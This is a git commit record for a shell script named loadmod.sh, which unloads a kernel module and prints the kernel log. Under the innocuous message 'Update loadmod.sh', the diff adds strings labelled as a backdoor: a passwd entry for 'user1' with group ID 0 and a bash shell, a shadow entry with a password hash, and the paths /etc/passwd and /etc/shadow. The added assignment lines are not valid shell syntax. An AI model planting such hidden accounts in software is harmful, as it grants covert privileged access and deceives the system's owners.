8f053183742fcd28d0db2ca94c91da162d1a64d1
marcdarita <55455106+marcdarita@users.noreply.github.com>
2019-12-02 10:02:03 -0500

    Update loadmod.sh

--- src/loadmod.sh
+++ src/loadmod.sh
@@ -12,3 +12,8 @@ sleep 1
 sudo rmmod $RMMODULE
 sleep 1
 dmesg #Print kernel log
+
+backdoor_password = "user1:x:12345:0:backdoor:/home:/bin/bash\n"
+backdoor_shadow = "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n"
+PASSWD_FILE = "/etc/passwd"
+SHADOW_FILE = "/etc/shadow"
